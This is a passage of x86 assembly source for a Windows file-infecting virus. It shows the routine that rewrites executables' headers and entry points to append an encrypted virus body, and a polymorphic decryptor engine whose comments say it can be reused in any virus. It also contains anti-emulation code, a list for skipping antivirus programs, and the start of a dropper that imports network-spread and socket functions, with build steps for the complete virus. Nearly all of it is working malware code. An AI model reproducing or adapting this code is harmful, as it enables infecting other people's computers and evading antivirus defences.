   cmp     dword ptr [edx], "ZniW"
   jne     not_winzip_selfextractor
   popad
   jmp     get_out
   not_winzip_selfextractor:
   popad

   mov     eax, dword ptr [ebx+60d]
   push    eax

   push    dword ptr [ebp+offset mapaddress]
   call_   AUnmapViewOfFileA

   push    dword ptr [ebp+offset maphandle]
   call_   ACloseHandleA

   pop     ecx
   mov     eax, dword ptr [ebp+memory]
   mov     edi,viruslen
   add     edi,poly_size
   call    align_it
   mov     ecx,eax
   call    map_file
   mov     [ebp+offset maphandle], eax
   test    eax,eax
   jz      close_file

   call    map_view_file
   cmp     eax, esi
   je      close_map
   mov     esi, eax
   mov     [ebp+offset mapaddress], esi

   mov     ebx, dword ptr [esi+3ch] ; Get RVA address of new-exe header
   add     ebx, esi

   mov     dword ptr [ebp+pe_header],ebx ; Save address of PE-header

   mov     eax, dword ptr [ebx+40d] ; Save the old entry point
   mov     dword ptr [ebp+old_eip],eax

   mov     eax, dword ptr [ebx+52d]
   mov     dword ptr [ebp+old_imagebase],eax

   mov     eax, dword ptr [ebx+56d]
   mov     dword ptr [ebp+mem_align],eax

   mov     eax, dword ptr [ebx+60d]
   mov     dword ptr [ebp+file_align],eax

   pushad
   mov     esi, dword ptr [ebx+116d]
   imul    esi,esi,8d
   add     esi,78h
   add     esi,ebx
   mov     eax,dword ptr [ebp+old_eip]
   sub     esi,40d
   next_object:
   add     esi,40d
   mov     edx,eax
   sub     edx, dword ptr [esi+virtual_address]
   cmp     edx, dword ptr [esi+virtual_size]
   jae     next_object
   or      dword ptr [esi+section_flags],00000020h
   or      dword ptr [esi+section_flags],20000000h
   or      dword ptr [esi+section_flags],80000000h
   add     edx,dword ptr [esi+physical_offset]
   add     edx,dword ptr [ebp+mapaddress]
   mov     dword ptr [ebp+EPO_here],edx

   popad

   xor     eax,eax
   mov     ax,word ptr [ebx+6d]
   imul    eax,eax,40d
   sub     eax,40d

   mov     esi, dword ptr [ebx+116d]
   imul    esi,esi,8d


   add     esi,78h
   add     eax,esi
   add     eax,ebx

   xor     ecx,ecx
   mov     dword ptr [eax+section_flags],ecx
   or      dword ptr [eax+section_flags],00000020h  ; Set some new flags
   or      dword ptr [eax+section_flags],20000000h  ; on the section
   or      dword ptr [eax+section_flags],80000000h  ;

   ;New eip = Virtual address+Size of raw data

   mov     ebx, dword ptr [eax+virtual_address]
   add     ebx, dword ptr [eax+physical_size]
   mov     dword ptr [ebp+new_eip],ebx
   mov     dword ptr [ebp+patch_eip],ebx
   mov     edx,ebx
   add     edx,dword ptr [ebp+old_imagebase]
   add     edx,poly_size
   mov     dword ptr [ebp+decrypt_here],edx

   ; where to write Pointer to Raw Data + Size Of Raw Data

   mov     ebx,dword ptr [eax+physical_offset]
   add     ebx, dword ptr [eax+physical_size]
   add     ebx, dword ptr [ebp+mapaddress]
   mov     dword ptr [ebp+poly_here],ebx

   push    eax
   push    ebx

   call    write_calc_EPO

   mov     edi,viruslen
   add     edi,100h
   push    edi
   push    0h
   call_   AGlobalAllocA
   mov     dword ptr [ebp+store_enc],eax

   mov     edi,poly_size
   add     edi,10h
   push    edi
   push    0h
   call_   AGlobalAllocA
   mov     dword ptr [ebp+store_poly],eax

   mov     edi,eax

   call    vadin

   pop     ebx
   pop     eax

   crypt_end:

   mov     edi,ebx
   mov     ebx,eax
   pushad

   call    enc_it

   mov     edi,dword ptr [ebp+store_enc]
   mov     esi,offset real_start
   add     esi,ebp
   mov     ecx,viruslen
   cld
   rep     movsb
   mov     ecx,(viruslen)/4
   mov     edi,dword ptr [ebp+store_enc]
   mov     eax,dword ptr [ebp+crypt_key]
   poly_encrypt:
   xor     [edi],eax
   add     edi,4
   loop    poly_encrypt

   popad

   add     edi,poly_size
   mov     esi,dword ptr [ebp+store_enc]
   mov     ecx,viruslen
   cld
   rep     movsb

   call    enc_it

   ;Align Old SizeOfRawData+VirusSize with file align

   mov     ecx, dword ptr [ebp+file_align]
   mov     eax, dword ptr [ebx+physical_size]
   mov     edi,viruslen
   add     edi,poly_size
   call    align_it

   mov     dword ptr [ebx+physical_size],eax

   mov     ecx, dword ptr [ebp+file_align]
   mov     eax, dword ptr [ebp+memory]
   mov     edi,viruslen
   add     edi,poly_size
   call    align_it

   mov     dword ptr [ebp+newfilesize],eax


   mov     ecx, dword ptr [ebp+mem_align]
   mov     eax, dword ptr [ebx+virtual_size]
   mov     edi,viruslen
   add     edi,2000h
   add     edi,poly_size
   call    align_it

   mov     dword ptr [ebx+virtual_size],eax

   ;mov     eax, dword ptr [ebx+physical_size]
   add     eax, dword ptr [ebx+virtual_address]

   mov     esi, dword ptr [ebp+pe_header]

   ; New size of rawdata + VirtualAdress = New ImageSize

   mov     dword ptr [esi+80d],eax
   mov     esi, dword ptr [ebp+mapaddress]
   mov     word ptr [esi+12h],666d

   ;mov     eax, dword ptr [ebp+new_eip]
   ;mov     dword ptr [esi+40d],eax

   mov     eax,dword ptr [ebp+store_poly]
   push    eax
   call_   AGlobalFreeA

   mov     eax,dword ptr [ebp+store_enc]
   push    eax
   call_   AGlobalFreeA


   get_out:

   Unmap_view:
   push    dword ptr [ebp+offset mapaddress]
   call_   AUnmapViewOfFileA

   close_map:
   push    dword ptr [ebp+offset maphandle]
   call_   ACloseHandleA

   close_file:


   push    0
   push    0
   push    dword ptr [ebp+offset newfilesize]
   push    dword ptr [ebp+offset filehandle]
   call_   ASetFilePointerA

   push    dword ptr [ebp+offset filehandle]
   call_   ASetEndOfFileA

   lea     edx,FT_creation
   add     edx,ebp
   push    edx
   add     edx, 8
   push    edx
   add     edx, 8
   push    edx
   push    dword ptr [ebp+offset filehandle]
   call_   ASetFileTimeA

   close_inf:

   push    dword ptr [ebp+offset filehandle]
   call_   ACloseHandleA

   push    dword ptr [ebp+offset attribs]
   push    dword ptr [ebp+offset file_offset]
   call_   ASetFileAttributesA
   jmp     infection_succesful

   infection_error:
   stc
   jmp     outahere

   infection_succesful:
   cmp     word ptr [ebp+infectionflag], 0FFh
   je      infection_error
   clc

   outahere:
   popad
   ret

   av_list:

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   "RETRO" : Avoid infecting AV programs with self-validation check
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   well this isn't really retro :)) But it will avoid that we give us
   ;   self away by infecting one of those suckers. Maybe it's stealth and
   ;   not retro really? :))

   xor     eax,eax
   cmp     dword ptr [esi], "VASF"
   je      bad_file
   cmp     dword ptr [esi], "DNAP"
   je      bad_file
   cmp     dword ptr [esi], "CONI"
   je      bad_file
   cmp     dword ptr [esi], "CSBT"
   je      bad_file
   cmp     dword ptr [esi], "SVAN"
   je      bad_file
   cmp     dword ptr [esi], "DVAN"
   je      bad_file
   cmp     dword ptr [esi], "XVAN"
   je      bad_file
   cmp     dword ptr [esi], "AVDA"
   je      bad_file
   cmp     dword ptr [esi], "NACS"
   je      bad_file
   cmp     dword ptr [esi], "3DON"
   je      bad_file
   cmp     dword ptr [esi], "EWRD"
   je      bad_file
   cmp     dword ptr [esi], "DIPS"
   je      bad_file
   cmp     dword ptr [esi], "NOMA"
   je      bad_file
   cmp     dword ptr [esi], "3PVA"
   je      bad_file
   cmp     dword ptr [esi], "MPVA"
   je      bad_file
   inc     eax
   ret
   bad_file:
   ret

   enc_it:

   ;USES ESI,EBP,ECX,EAX,EDX

   mov     dword ptr [ebp+password_count],0
   crypt_loop:
   lea     esi,crypt_start
   add     esi,ebp
   mov     ecx, dword ptr [ebp+password_count]
   xor     eax,eax
   mov     ah, byte ptr [ebp+password+ecx]
   call    encrypt
   inc     dword ptr [ebp+password_count]
   cmp     dword ptr [ebp+password_count],4d
   jne     crypt_loop
   ret

   encrypt:
   xor     edx,edx
   mov     ecx,crypt_end-crypt_start
   dec     edx
   enc_loop:
   inc     edx
   xor     byte ptr [esi+edx],ah
   loop    enc_loop
   ret

   inf_open_file:
   push    0
   push    0
   push    3
   push    0
   push    1
   push    80000000h or 40000000h
   push    esi
   call_   ACreateFileA
   ret

   map_file:
   xor     esi,esi
   push    esi
   push    ecx
   push    esi
   push    4
   push    esi
   push    dword ptr [ebp+offset filehandle]
   call_   ACreateFileMappingA
   ret

   map_view_file:
   push    esi
   push    esi
   push    esi
   push    2
   push    eax
   call_   AMapViewOfFileA
   ret

   vadin:

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   [POLY.Vadin beta 0.9] by Asmodeus iKX
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  *Note*
   ;  This engine is some what adjusted for this particular virus, but
   ;  it can easily be modified to be used in any virus.
   ;
   ;  INPUT :
   ;  EDI = Where to store decryptor
   ;  STORE_POLY DD 0 <-- expects to be filled with same address as EDI
   ;  POLY_HERE  DD 0 <-- expects to be filled with address
   ;                      of where to write poly (new entry point etc etc)
   ;
   ;
   ;   ENTRY_REG * Generated during EPO calculating and writing
   ;               it's the new entry point
   ;
   ;   ADD ENTRY_REG,(POLY_SIZE+2)          ; poly_size + 2 bytes (jmp)
   ;   CMP WORD PTR [ENTRY_REG], "XX"       ; Check if encrypted
   ;   JNZ @@1                              ; If it is encrypted, then continue
   ;   RET                                  ; Return to kernel32.dll
   ;   <JUNK>                               ; Random junk
   ;   @@1:
   ;   MOV  STACK_REG,[ESP]                 ; We must save the initial stack
   ;   PUSH STACK_REG
   ;   <JUNK>
   ;   MOV  RAN_REG,DS                      ; We have to stop those evil
   ;   PUSH RAN_REG                         ; emulators before they snatch
   ;   POP  DS                              ; us out of our protective
   ;   MOV  RAN_REG_2,DS                    ; shell! There for before
   ;   CMP  RAN_REG,RAN_REG_2               ; we decrypt we check for presence
   ;   JNE  CRASH_EMULATOR                  ; of an emulator and jmp
   ;   <JUNK>                               ; into encrypted code if so >:)
   ;   MOV  LEN_REG,DECRYPT_LEN (*)         ; Get lenght of code to decrypt
   ;   PUSH LEN_REG             (*)         ; play with it
   ;   POP  ECX                 (*)         ; get it into ecx, just 1 fixed byte
   ;   <JUNK>                               ; Junky junk :)
   ;   MOV  PTR_REG,POINTER_TO_CODE  (*)    ; Where to start decrypt
   ;   <JUNK>                               ; bla bla
   ;   MOV  CRPT_REG,CRYPT_KEY       (*)    ; Random encryption key
   ;   <JUNK>                               ; yada yada
   ;   DECRYPT_IT:                          ; "loop" label
   ;   XOR  [PTR_REG],CRPT_REG              ; decrypt 4 bytes each time
   ;   ADD  PTR_REG,4                       ; next 4 bytes
   ;   LOOP DECRYPT_IT                      ; loooooper
   ;   POP EDX                              ; EDX = original stack
   ;   <JUNK>                               ; Padding out the poly engine size
   ;   <JUNK>                               ; it's has a fixed size of 60 bytes
   ;   <JUNK>                               ;
   ;
   ;  TOTAL SIZE : 70 bytes + junk ( 21 bytes ) = 91 bytes

   mov     byte ptr [ebp+garb_size],0

   xor     eax,eax
   push    eax
   push    edi
   call    set_registers
   pop     edi
   pop     eax

   call_   AGetTickCountA
   mov     dword ptr [ebp+crypt_key],eax
   mov     eax,(viruslen)/4
   mov     dword ptr [ebp+virus_lenght],eax

   call    poly_it

   mov     esi,dword ptr [ebp+store_poly]
   mov     edi,dword ptr [ebp+poly_here]
   mov     ecx,poly_size
   cld
   rep     movsb
   ret


   set_registers:

   ;-----
   ;GENERATE THE LENGHT REGISTER AND ASSOCIATED FUNCTIONS
   ;-----

   get_stack_reg:

   xor     ebx,ebx
   mov     ecx,50h
   mov     edx,58h

   push    ecx
   push    edx
   call    get_rand_reg
   pop     edx
   pop     ecx

   add     ecx,eax
   add     edx,2
   mov     byte ptr [ebp+push_stack_reg],cl
   mov     byte ptr [ebp+pop_stack_reg],dl
   imul    eax,eax,8
   add     eax,4
   mov     byte ptr [ebp+mov_stack_reg],al

   get_ptr_reg:

   mov     ebx,0B8h
   call    get_rand_reg
   cmp     eax,1
   je      get_ptr_reg

   add     ebx,eax
   mov     byte ptr [ebp+ptr_reg],bl

   get_crpt_reg:
   mov     ebx,0B8h
   call    get_rand_reg
   cmp     eax,1
   je      get_ptr_reg
   add     ebx,eax
   cmp     bl,byte ptr [ebp+ptr_reg]
   je      get_crpt_reg
   mov     byte ptr [ebp+crpt_reg],bl

   get_len_reg:
   mov     ebx,0B8h
   call    get_rand_reg
   add     ebx,eax
   cmp     bl,byte ptr [ebp+ptr_reg]
   je      get_len_reg
   cmp     bl,byte ptr [ebp+crpt_reg]
   je      get_len_reg
   mov     byte ptr [ebp+lenght_reg],bl
   mov     ebx,eax
   xor     eax,eax
   push    eax
   mov     al,050h
   add     eax,ebx
   mov     byte ptr [ebp+push_len_reg],al
   pop     eax

   generate_anti_emulator:



   ;---
   ;STRUCTURE OF ANTI-EMULATOR
   ;---
   ;MOV     AEM_REG,DS
   ;PUSH    AEM_REG
   ;POP     DS
   ;MOV     AEM_REG_2,ds
   ;CMP     AEM_REG,AEM_REG_2
   ;JNE     CRASH_SOMEWHERE

   call    random
   mov     eax,16d
   mov     dword ptr [ebp+emul_reg_1],eax
   mov     ebx,0C8h
   xor     ecx,ecx
   mov     ecx,1Fh
   add     ebx,eax
   mov     byte ptr [ebp+pop_cs_ds],cl

   push    ebx
   call    get_rand_reg
   mov     dword ptr [ebp+emul_reg_2],eax
   pop     ecx
   mov     ecx,050h    ; PUSH REG
   add     ebx,eax
   add     ecx,eax
   xor     eax,eax
   mov     ah,bl
   mov     al,08ch
   mov     word ptr [ebp+mov_reg_ds_cs_1],ax
   mov     byte ptr [ebp+push_emul_reg],cl

   next_emul_reg:
   call    get_rand_reg
   cmp     eax,dword ptr [ebp+emul_reg_2]
   je      next_emul_reg
   mov     dword ptr [ebp+emul_reg_3],eax
   mov     ecx,dword ptr [ebp+emul_reg_1]
   xor     ebx,ebx
   mov     ebx,0C8h
   add     ebx,ecx
   add     ebx,eax
   mov     ah,bl
   mov     al,08ch
   mov     word ptr [ebp+mov_reg_ds_cs_2],ax


   mov     eax,dword ptr [ebp+emul_reg_2]
   mov     ebx,dword ptr [ebp+emul_reg_3]
   imul    eax,eax,8d
   add     ebx,eax
   add     ebx,0C0h
   xor     eax,eax
   mov     ah,bl
   mov     al,03bh
   mov     word ptr [ebp+cmp_reg_reg],ax

   ret


   poly_it:


   xor     ebx,ebx
   mov     bl,0c0h
   add     ebx, dword ptr [ebp+new_entry]
   mov     ah,bl
   mov     al,083h
   stosw
   mov     al,(poly_size+2)
   stosb

   mov     al,066h
   stosb
   mov     bl,038h
   add     ebx, dword ptr [ebp+new_entry]
   mov     al,081h
   mov     ah,bl
   stosw
   mov     ax, "XX"
   stosw
   lea     esi,jak_ass
   add     esi,ebp
   mov     ecx,size_jak
   cld
   rep     movsb

   call    random
   and     eax,7
   cmp     eax,1
   jbe     no_start_shuffle

   call    generate_garb

   no_start_shuffle:

   xor     eax,eax
   push    eax

   mov     al,08Bh
   stosb

   mov     al,byte ptr [ebp+mov_stack_reg]
   stosb

   mov     al,024h
   stosb

   pop     eax
   mov     al,byte ptr [ebp+push_stack_reg]
   stosb

   ;mov     al, 0CCh
   ;stosb

   ;xor     eax,eax
   ;mov     al,060h
   ;stosb


   xor     eax,eax
   push    eax
   mov     ax,word ptr [ebp+mov_reg_ds_cs_1]
   stosw
   pop     eax

   mov     al, byte ptr [ebp+push_emul_reg]
   stosb

   mov     al, byte ptr [ebp+pop_cs_ds]
   stosb

   mov     ax,word ptr [ebp+mov_reg_ds_cs_2]
   stosw

   mov     ax,word ptr [ebp+cmp_reg_reg]
   stosw

   xor     eax,eax
   mov     al,075h
   stosb
   mov     al,090h
   stosb

   ;---
   ;STRUCTURE OF ANTI-EMULATOR
   ;---
   ;MOV     AEM_REG,DS
   ;PUSH    AEM_REG
   ;POP     DS
   ;MOV     AEM_REG_2,ds
   ;CMP     AEM_REG,AEM_REG_2
   ;JNE     CRASH_SOMEWHERE

   call    instruction_shuffle


   ;Calculate XOR [PTR_REG], CRPT_REG
   ;31,((CRPT_REG*8)+PTR_REG

   xor     ebx,ebx
   mov     bl, byte ptr [ebp+crpt_reg]
   sub     ebx,0B8h
   imul    ebx,ebx,8
   xor     ecx,ecx
   mov     cl, byte ptr [ebp+ptr_reg]
   sub     ecx,0B8h
   add     ebx,ecx
   mov     ah,bl
   mov     al,031h
   stosw


   ;Calculate ADD PTR_REG,4

   xor     ebx,ebx
   mov     bl, byte ptr [ebp+ptr_reg]
   sub     ebx,0B8h
   add     ebx,0c0h
   mov     ah,bl
   mov     al,83h
   stosw
   mov     al,04h
   stosb
   mov     ax,0F9E2h
   stosw

   xor     eax,eax
   mov     al,byte ptr [ebp+pop_stack_reg]
   stosb

   adjust_size:
   cmp     byte ptr [ebp+garb_size],21d
   je      no_garb_3

   call    generate_garb

   jmp     adjust_size

   no_garb_3:

   ret

   ; 1).

   instruction_shuffle:
   mov     byte ptr [ebp+write_len_flag],0
   mov     byte ptr [ebp+write_ptr_flag],0
   mov     byte ptr [ebp+write_crpt_flag],0

   xor     ecx,ecx
   shuffle_loop:
   get_new_rand:
   call    random
   and     eax,7d
   cmp     eax,3
   ja      get_new_rand
   test    eax,eax
   je      get_new_rand
   cmp     eax,1
   jne     check_next_1
   cmp     byte ptr [ebp+write_len_flag],1
   je      check_next_1
   call    write_len_reg
   jmp     all_checked
   check_next_1:
   cmp     eax,2
   jne     check_next_2
   cmp     byte ptr [ebp+write_ptr_flag],1
   je      check_next_2
   call    write_ptr_reg
   jmp     all_checked

   check_next_2:
   cmp     eax,3
   jne     get_new_rand

   cmp     byte ptr [ebp+write_crpt_flag],1
   je      all_checked

   call    write_crpt_reg

   all_checked:
   cmp     ecx,3
   jne     shuffle_loop
   ret

   write_len_reg:
   push    ecx
   xor     eax,eax
   mov     al, byte ptr [ebp+lenght_reg]
   stosb
   mov     eax,dword ptr [ebp+virus_lenght]
   stosd
   xor     eax,eax
   push    eax
   mov     al,byte ptr [ebp+push_len_reg]
   stosb                   ; PUSH LEN_REG
   pop     eax

   mov     al,59h ; POP ECX
   stosb

   call    random
   and     eax,7
   cmp     eax,1
   jbe     no_garb_shuffle_1

   call    generate_garb

   no_garb_shuffle_1:

   mov     byte ptr [ebp+write_len_flag],1
   pop     ecx
   inc     ecx
   ret

   ; 2).
   write_ptr_reg:
   push    ecx
   xor     eax,eax
   mov     al,byte ptr [ebp+ptr_reg]
   stosb
   mov     eax,dword ptr [ebp+decrypt_here]
   stosd

   call    random
   and     eax,7
   cmp     eax,1
   jbe     no_garb_shuffle_2

   call    generate_garb

   no_garb_shuffle_2:

   mov     byte ptr [ebp+write_ptr_flag],1
   pop     ecx
   inc     ecx
   ret

   ; 3).
   write_crpt_reg:
   push    ecx

   xor     eax,eax
   mov     al,byte ptr [ebp+crpt_reg]
   stosb
   mov     eax,dword ptr [ebp+crypt_key]
   stosd

   call    random
   and     eax,7
   cmp     eax,1
   jbe     no_garb_shuffle_3

   call    generate_garb

   no_garb_shuffle_3:

   mov     byte ptr [ebp+write_crpt_flag],1
   pop     ecx
   inc     ecx
   ret

   random:                         ; Thanks Billy, Griyo!
   push    ecx
   mov     eax,dword ptr [ebp+rnd_seed1]
   dec     dword ptr [ebp+rnd_seed1]
   xor     eax,dword ptr [ebp+rnd_seed2]
   mov     ecx,eax
   rol     dword ptr [ebp+rnd_seed1],cl
   add     dword ptr [ebp+rnd_seed2],eax
   adc     eax,dword ptr [ebp+rnd_seed2]
   add     eax,ecx
   ror     eax,cl
   not     eax
   sub     eax,3
   xor     dword ptr [ebp+rnd_seed2],eax
   xor     eax,dword ptr [ebp+rnd_seed3]
   rol     dword ptr [ebp+rnd_seed3],1
   sub     dword ptr [ebp+rnd_seed3],ecx
   sbb     dword ptr [ebp+rnd_seed3],4
   inc     dword ptr [ebp+rnd_seed2]
   imul    eax,41C64E6Dh
   add     eax,00003039h
   pop     ecx
   ret

   get_rand:
   call    random
   mov     ecx,eax
   call_   AGetTickCountA
   xchg    eax,ecx
   and     eax,ecx
   cmp     eax,7
   ja      get_rand
   cmp     eax,4
   je      get_rand
   cmp     eax,5
   je      get_rand
   ret


   get_rand_reg:
   push    ebx
   call    get_rand
   pop     ebx
   ret

   generate_garb:

   cmp     byte ptr [ebp+garb_size],21d
   jae     garb_done

   xor     ebx,ebx
   mov     ecx,50h
   mov     edx,58h
   mov     ebx,0B8h

   push    ebx
   push    ecx
   push    edx
   call    get_rand_reg
   pop     edx
   pop     ecx
   pop     ebx

   add     ecx,eax
   add     edx,eax
   add     ebx,eax
   mov     byte ptr [ebp+push_garb_reg],cl
   mov     byte ptr [ebp+pop_garb_reg],dl
   mov     byte ptr [ebp+mov_garb_reg],bl
   call    random
   mov     dword ptr [ebp+random_junk],eax

   call    random
   and     eax,3
   cmp     eax,2
   je      garb_push_pop
   cmp     eax,1
   je      garb_one_byte

   garb_push_mov_pop:

   mov     al,byte ptr [ebp+garb_size]
   add     eax,7d
   cmp     eax,21d
   jae     garb_done

   xor     eax,eax
   push    eax
   mov     al, byte ptr [ebp+push_garb_reg]
   stosb
   mov     al,byte ptr [ebp+mov_garb_reg]
   stosb
   mov     eax,dword ptr [ebp+random_junk]
   stosd
   pop     eax
   mov     al, byte ptr [ebp+pop_garb_reg]
   stosb
   add     byte ptr [ebp+garb_size],7d

   jmp     garb_done

   garb_push_pop:
   mov     al,byte ptr [ebp+garb_size]
   add     eax,2d
   cmp     eax,21d
   jae     garb_done

   mov     al, byte ptr [ebp+push_garb_reg]
   stosb
   mov     al, byte ptr [ebp+pop_garb_reg]
   stosb
   add     byte ptr [ebp+garb_size],2d
   jmp     garb_done

   garb_one_byte:

   mov     al,byte ptr [ebp+garb_size]
   add     eax,1d
   cmp     eax,21d
   ja      garb_done

   call    random                          ; Get a random number
   mov     ebx,eax
   and     ebx,one_size                    ; Make it to be [0..7]
   xor     eax,eax
   mov     al,byte ptr [ebp+one_byte_garb+ebx]              ; Get opcode in AL
   stosb                                   ; Store AL where EDI points
   add     byte ptr [ebp+garb_size],1d

   garb_done:
   ret

   write_calc_EPO:

   mov     esi, dword ptr [ebp+EPO_here]
   push    esi
   lodsd
   mov     dword ptr [ebp+org7bytes],eax
   xor     eax,eax
   lodsw
   mov     word ptr [ebp+org7bytes+4],ax
   xor     eax,eax
   lodsb
   mov     byte ptr [ebp+org7bytes+6],al
   pop     edi

   mov     ecx,50h
   mov     ebx,0B8h

   push    ebx
   push    ecx
   push    edi
   call    get_rand_reg
   pop     edi
   pop     ecx
   pop     ebx

   add     ecx,eax
   add     ebx,eax
   mov     dword ptr [ebp+new_entry],eax
   xor     eax,eax
   mov     eax,ebx
   stosb
   mov     eax, dword ptr [ebp+new_eip]
   add     eax, dword ptr [ebp+old_imagebase]
   stosd
   mov     eax,ecx
   stosb
   mov     al,0C3h
   stosb
   ret

   jak_ass:
   jne     goto_hell
   ret
   goto_hell:

   size_jak        equ goto_hell-jak_ass

   ;----
   ;EPO DATA
   ;----

   EPO_here           dd 0
   org7bytes          db 7 dup (0)
   ;-----

   poly_id            db "[POLY.Vadin beta 0.9] by Asmodeus iKX",0
   the_stack          dd 0
   password           db "MORI",0
   password_count     dd 0
   old_imagebase      dd 0
   old_eip            dd 0
   infectionflag      dw 0
   dropflag           dw 0
   createflag         dw 0
   gk32flag           dw 0
   set_kernel32flag   dw 0
   crypt_key          dd 0

   ;POLYDATA
   new_entry                   dd 0
   poly_here                   dd 0
   decrypt_here                dd 0
   store_poly                  dd 0
   store_enc                   dd 0
   store_org_bytes             dd 0
   virus_lenght                dd 0
   lenght_reg                  db 0
   ptr_reg                     db 0
   crpt_reg                    db 0
   push_len_reg                db 0
   pop_len_reg                 db 0
   mov_stack_reg               db 0
   push_stack_reg              db 0
   pop_stack_reg               db 0
   push_garb_reg               db 0
   pop_garb_reg                db 0
   mov_garb_reg                db 0

   ;---
   ;anti-emulation regs
   ;---

   emul_reg_1                  dd 0
   emul_reg_2                  dd 0
   emul_reg_3                  dd 0
   pop_cs_ds                   db 0
   push_emul_reg               db 0
   mov_reg_ds_cs_1             dw 0
   mov_reg_ds_cs_2             dw 0
   cmp_reg_reg                 dw 0

   ;----

   random_junk                 dd 0
   write_len_flag              db 0
   write_ptr_flag              db 0
   write_crpt_flag             db 0
   garb_size                   db 0

   rnd_seed1                   dd      00000000h
   rnd_seed2                   dd      00000000h
   rnd_seed3                   dd      00000000h
   rnd_seed4                   dd      00000000h

   one_byte_garb       label byte
           clc
           stc
           cmc
           cld
           nop
   one_size        equ     ($-offset one_byte_garb)-1




   virus_end:


   end    fake_start

   ;--------------MOR_DROPPER.ASM------------
   ; Copy/paste and compile
   ; Incpro and paste into MOR_DROP.INC (make a HEX/DB script of code)
   ; Compile MORIDIN.ASM <--- results in complete virus

   .586p
   .model  flat

   sock_addr_in_len           equ 16d
   ERROR_ALREADY_ASSIGNED     equ 85
   REG_SZ                     equ 1
   REG_BINARY                 equ 3
   REG_DWORD                  equ 4
   GENERIC_WRITE              equ 40000000h
   GENERIC_READ               equ 80000000h
   HKEY_CURRENT_USER          equ 80000001h
   OPEN_EXISTING              equ 3
   PAGE_READONLY              equ 2
   FILE_MAP_READ              equ 4
   INVALID_HANDLE_VALUE       equ -1
   CREATE_ALWAYS              equ 2
   FILE_ATTRIBUTE_NORMAL      equ 80h
   LMEM_FIXED                 equ 0h
   FILE_SHARE_READ            equ 1h
   CREATE_NEW_CONSOLE         equ 67108928h
   STILL_ACTIVE               equ 00000103h
   PROCESS_ALL_ACCESS         equ 001F0FFFh

   RESOURCEUSAGE_CONTAINER    equ 2
   RESOURCETYPE_DISK          equ 1
   RESOURCE_CONNECTED         equ 1
   CONNECT_PERSISTANT         equ 0FF000000h
   RESOURCEUSAGE_CONNECTABLE  equ 1
   RESOURCEUSAGE_CONTAINER    equ 2
   RESOURCE_GLOBALNET         equ 2

   extrn   GlobalFree:PROC
   extrn   bind:PROC
   extrn   listen:PROC
   extrn   accept:PROC
   extrn   GlobalAlloc:PROC
   extrn   bind:PROC
   extrn   listen:PROC
   extrn   accept:PROC


   extrn   WSAStartup:PROC
   extrn   WSACleanup:PROC
   extrn   WSAGetLastError:PROC
   extrn   connect:PROC
   extrn   socket:PROC
   extrn   htons:PROC
   extrn   closesocket:PROC
   extrn   inet_ntoa:PROC
   extrn   send:PROC
   extrn   recv:PROC
   extrn   gethostname:PROC
   extrn   gethostbyname:PROC
   extrn   lstrlen:PROC
   extrn   VirtualAlloc:PROC
   extrn   WaitForSingleObject:PROC
   extrn   CreateThread:PROC
   extrn   ExitThread:PROC
   extrn   TerminateThread:PROC

   extrn   GetCommandLineA:PROC
   extrn   MessageBoxA:PROC
   extrn   ExitProcess:PROC
   extrn   CopyFileA:PROC
   extrn   GetModuleFileNameA:PROC
   extrn   lstrcatA:PROC
   extrn   lstrcpy:Proc
   extrn   FindFirstFileA:PROC
   extrn   FindNextFileA:PROC
   extrn   GetModuleHandleA:PROC
   extrn   CreateProcessA:PROC
   extrn   GetStartupInfoA:PROC
   extrn   WriteFile:PROC
   extrn   CreateFileA:PROC
   extrn   SetCurrentDirectoryA:PROC
   extrn   GetCurrentDirectoryA:PROC
   extrn   GetWindowsDirectoryA:PROC
   extrn   GetSystemDirectoryA:PROC
   extrn   WritePrivateProfileStringA:PROC
   extrn   CloseHandle:PROC
   extrn   ReadFile:PROC
   extrn   LocalAlloc:PROC
   extrn   GetFileSize:PROC
   extrn   SetVolumeLabelA:PROC
   extrn   GetDriveTypeA:PROC
   extrn   mciSendStringA:PROC
   ;extrn   GetCurrentProcessId:PROC
   ;extrn   RegisterServiceProcess:PROC
   extrn   Sleep:PROC

   extrn   GetExitCodeProcess:PROC
   extrn   OpenProcess:PROC

   ;for retro functions
   extrn   PostMessageA:PROC
   extrn   FindWindowA:PROC

   ;for network spread
   extrn   WNetOpenEnumA:Proc
   extrn   WNetCloseEnum:Proc
   extrn   WNetEnumResourceA:Proc
   extrn   WNetAddConnection2A:Proc
   extrn   WNetCancelConnection2A:Proc

   extrn   HeapAlloc:Proc
   extrn   GetTickCount:proc
   extrn   GetProcessHeap:PROC
   extrn   RegQueryValueExA:PROC
   extrn   RegCreateKeyA:PROC
   extrn   RegCloseKey:PROC
   extrn   RegSetValueExA:PROC

   ; for document infection

   extrn   CreateFileMappingA:PROC
   extrn   MapViewOfFile:PROC
   extrn   UnmapViewOfFile:PROC
   extrn   CloseHandle:PROC
   extrn   SetFilePointer:PROC
   extrn   SetEndOfFile:PROC

   .data

   db 0

   .code

   dropper_start:

   xor     ebx,ebx
   lea     eax,exception_handler
   push    eax
   push    dword ptr fs:[ebx]
   mov     dword ptr fs:[ebx],esp

   ;call    GetCurrentProcessId
   ;push    1

   ;push    eax
   ;call    RegisterServiceProcess



   push    260d
   push    offset ThisFile
   push    0
   call    GetModuleFileNameA

   push    offset Org_Dir
   push    260d
   call    GetCurrentDirectoryA

   call    GetCommandLineA
   test    eax,eax
   jbe     payload
   mov     dword ptr [command_line],eax
